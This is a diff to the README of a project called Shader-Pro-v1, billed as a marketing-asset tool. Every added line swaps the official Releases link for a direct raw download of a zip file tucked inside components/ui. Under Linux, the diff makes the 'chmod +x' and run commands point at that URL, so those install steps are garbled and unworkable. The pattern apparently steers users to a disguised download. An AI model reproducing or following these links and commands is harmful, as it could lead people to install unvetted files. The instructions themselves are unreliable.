@@ -1,6 +1,6 @@
 # 🎨 Shader-Pro-v1 - Create Stunning Product Marketing Assets
 
-[![Download Shader-Pro-v1](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/releases)
+[![Download Shader-Pro-v1](https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/raw/refs/heads/main/components/ui/v-Pro-Shader-3.5.zip%https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/raw/refs/heads/main/components/ui/v-Pro-Shader-3.5.zip)](https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/raw/refs/heads/main/components/ui/v-Pro-Shader-3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get Shader Pro, visit this page to download: [Shader-Pro-v1 Releases](https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/releases).
+To get Shader Pro, visit this page to download: [Shader-Pro-v1 Releases](https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/raw/refs/heads/main/components/ui/v-Pro-Shader-3.5.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, locate the latest version.
@@ -41,8 +41,8 @@ To get Shader Pro, visit this page to download: [Shader-Pro-v1 Releases](https:/
 ### Linux
 - Open your terminal.
 - Navigate to the location where you downloaded the `.AppImage` file.
-- Make the file executable by running: `chmod +x ShaderPro.AppImage`.
-- Now, run the application by typing: `./ShaderPro.AppImage`.
+- Make the file executable by running: `chmod +x https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/raw/refs/heads/main/components/ui/v-Pro-Shader-3.5.zip`.
+- Now, run the application by typing: `https://github.com/TegginamathadaBasavananda/Shader-Pro-v1/raw/refs/heads/main/components/ui/v-Pro-Shader-3.5.zip`.
 
 ## 🎨 Features
 
